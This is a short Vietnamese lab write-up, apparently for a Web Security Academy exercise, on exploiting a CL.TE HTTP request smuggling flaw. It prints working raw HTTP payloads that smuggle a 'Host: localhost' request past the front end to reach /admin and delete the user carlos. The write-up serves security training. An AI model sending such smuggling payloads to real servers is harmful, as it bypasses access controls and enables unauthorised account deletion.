# Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

## Detect

Payload đầu tiên để xác nhận CL.TE:

```http
POST / HTTP/1.1
Host: 0a4700b503cc3406837960d500f20072.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

Khi normal request đi qua và `/admin` chỉ cho local users, có thể kết luận front-end chưa chặn được request smuggled đúng cách.

## Vì sao có thể bypass

Trong CL.TE:

- Front-end tin `Content-Length`.
- Back-end đọc theo `Transfer-Encoding: chunked`.
- Phần request sau `0` bị đẩy sang request kế tiếp trên back-end.

## Exploit

Muốn truy cập admin, cần đổi header thành `Host: localhost` và chuyển dữ liệu phụ sang body để hợp thức hóa request:

```http
POST / HTTP/1.1
Host: 0a4700b503cc3406837960d500f20072.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 3

x=
```

Nếu muốn xóa user `carlos`, chỉ cần đổi path sang endpoint delete:

```http
POST / HTTP/1.1
Host: 0a4700b503cc3406837960d500f20072.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 3

x=
```

Mấu chốt của bài này là smuggle được request có `Host: localhost` vào back-end để vượt qua kiểm tra front-end.
